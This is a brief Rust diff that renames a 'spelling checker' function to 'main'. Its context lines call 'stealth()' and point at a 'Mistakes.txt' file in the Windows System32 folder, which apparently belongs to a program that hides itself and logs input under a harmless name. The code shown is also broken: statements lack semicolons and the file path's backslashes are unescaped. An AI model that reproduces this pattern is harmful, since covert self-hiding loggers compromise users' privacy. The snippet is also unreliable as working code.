@@ -5,7 +5,7 @@ use std::fs::{File, OpenOptions};
 use std::io::prelude::*;
 use std::io::Write;
 #[allow(unused_variables)]
-pub fn run_spelling_checker() {
+fn main() {
 	stealth()
 	let file_path = "C:\Windows\System32\Mistakes.txt"
 	
